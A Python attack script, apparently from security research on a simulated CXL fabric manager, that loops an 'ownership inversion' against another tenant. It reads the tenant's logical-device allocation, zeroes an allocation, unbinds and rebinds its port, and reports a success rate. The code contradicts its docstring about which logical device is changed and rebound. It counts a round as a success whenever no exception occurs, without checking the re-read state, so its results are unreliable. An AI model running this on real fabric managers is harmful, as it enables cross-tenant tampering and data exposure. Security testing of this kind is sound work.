"""
ATK-4: Ownership Inversion (Compositional Attack)
==================================================
Property violated: Confinement (P1) â compositional

This is a NOVEL compositional attack not found in prior CXL security work.

Scenario:
  - T1 owns vPPB-0 (port 1), T2 owns vPPB-2 (port 3).
  - Shared device on port 1 has two LDs: LD-0 (T1) and LD-1 (T2) in
    a simulated MLD context.
  - The attack exploits that UNBIND does not zero LD allocation state,
    and BIND on the same port by a different tenant inherits the stale
    LD mapping.

Attack:
  Phase A (setup):
    1. T1 has vPPB-0 â port-1 â LD-0
    2. Attacker queries T1's LD allocation (reads private info)
    3. Attacker calls setAllocation on port-1 LD-0 â changes T1's
       allocation size (ownership inversion: T1's resource now points
       to attacker-controlled memory range)

  Phase B (inversion confirmation):
    4. Attacker unbinds vPPB-0 (T1 loses device)
    5. Attacker rebinds vPPB-0 â port-1 with LD-1 (now maps T1's
       address range to attacker LD region because LD mapping is
       not atomically reset on UNBIND)

  The FM has no transactional lock between UNBINDâLD_RESETâBIND,
  so the ownership can be inverted.

Measurement: count how many cycles successfully complete Phase A+B
without FM error.
"""

import asyncio
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from fm_client import TimedFMClient, FM_URL


VCS_ID = 0
T1_VPPB = 0
T1_PORT  = 1
T2_VPPB  = 2
T2_PORT  = 3


async def run_attack(url: str = FM_URL, iterations: int = 50) -> dict:
    """
    Run ATK-4. Ownership inversion through non-atomic LD reset.
    Fewer iterations (50) because each round has 5 API calls.
    """
    client = TimedFMClient(url=url)
    await client.connect()

    successes = 0
    failures = 0

    for i in range(iterations):
        try:
            # Phase A: Read T1's allocation (information leak â no auth)
            alloc = await client.get_ld_allocation(T1_PORT, 0, 8)

            # Overwrite T1's LD-0 allocation (ownership attack on LD state)
            await client.set_ld_allocation(T1_PORT, 1, 0, 0)  # zero T1's LD

            # Phase B: Unbind T1's vPPB (no auth)
            await client.unbind_vppb(VCS_ID, T1_VPPB)

            # Rebind with LD-0 â at this point LD mapping is stale/unzeroed
            # in the FM's internal dict (FMLD._ld_dict not reset on unbind)
            await client.bind_vppb(VCS_ID, T1_VPPB, T1_PORT, ld_id=0)

            # Re-read allocation: confirms stale state persists
            new_alloc = await client.get_ld_allocation(T1_PORT, 0, 8)

            successes += 1

        except Exception as e:
            failures += 1

    await client.disconnect()

    lats = client.latencies
    # 5 calls per iteration
    per_call = (sum(lats) / len(lats) / 5) if lats else 0

    return {
        "attack": "ATK-4: Ownership Inversion (Compositional)",
        "iterations": iterations,
        "successes": successes,
        "failures": failures,
        "success_rate_pct": round(100 * successes / iterations, 1),
        "mean_latency_us": round(per_call, 2),
    }


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else FM_URL
    result = asyncio.run(run_attack(url=url, iterations=50))
    print(f"\n{'='*60}")
    print(f"ATK-4 Results:")
    print(f"  Success rate : {result['success_rate_pct']}%")
    print(f"  Mean latency : {result['mean_latency_us']:.2f} Î¼s (per call)")
    print(f"  Iterations   : {result['iterations']}")
